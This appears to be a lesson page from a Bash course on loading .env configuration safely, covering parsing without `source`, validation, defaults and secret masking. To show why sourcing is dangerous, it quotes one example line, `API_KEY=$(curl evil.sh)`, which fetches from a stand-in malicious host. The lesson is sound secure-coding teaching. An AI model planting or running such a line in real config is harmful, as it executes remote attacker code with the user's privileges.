# Day 10 — Environment Variables & Config

Today's goal: load configuration the safe way — parse a `.env` **without**
`source`, validate every required variable, apply defaults, mask secrets, and
export a clean environment for the rest of the app. This is the pattern real
services boot with.

---

## 📁 Scripts for today

| Script | Path | What it does | Try it |
|---|---|---|---|
| **Config Loader** | `days/day10/scripts/config-loader.sh` | Parses `.env` line-by-line (never sources it), validates required vars + `APP_ENV`, applies defaults, masks secrets, exports readonly config | `cp .env.example .env && bash days/day10/scripts/config-loader.sh` |
| **App** | `days/day10/scripts/app.sh` | Tiny consumer that sources the loader and "connects" using the loaded config | `bash days/day10/scripts/app.sh` |

---

## 1. Why not just `source .env`?

`source .env` **executes** the file as Bash. One line like `API_KEY=$(curl evil.sh)`
would run with your privileges. Instead, parse `KEY=VALUE` by hand:
- skip comments and blank lines
- allow an optional leading `export`
- refuse anything that isn't a valid assignment (don't run it)
- strip matching surrounding quotes

## 2. Validate before you trust

```bash
required_vars=(APP_ENV TARGET_HOST API_KEY)   # names match .env.example exactly
case "$APP_ENV" in dev|staging|prod) ;; *) exit 1 ;; esac
[[ "$TARGET_PORT" =~ ^[0-9]+$ ]] || exit 1
```

> Regression fixed here: the old loader required `DB_HOST`, which never existed
> in the template. The real deployment target is `TARGET_HOST`.

## 3. Defaults, secrets, and export

```bash
: "${TARGET_PORT:=443}"                 # default only if unset/empty
readonly APP_ENV TARGET_HOST API_KEY   # lock, then export
export  APP_ENV TARGET_HOST API_KEY
```
Secrets are **masked** in logs (`sk***90`) — never print an API key in the clear.

---

## ✅ Verify

```bash
bats days/day10/tests
```

---

## Recap

| Concept | One-liner |
|---|---|
| Load | parse `KEY=VALUE`, never `source` untrusted config |
| Validate | required vars + allowed `APP_ENV` + numeric ports |
| Defaults | `: "${VAR:=default}"` |
| Secrets | mask in logs; `readonly` then `export` |

Next up: **Day 11 — Error handling, logging & debugging** (start of Phase 3).
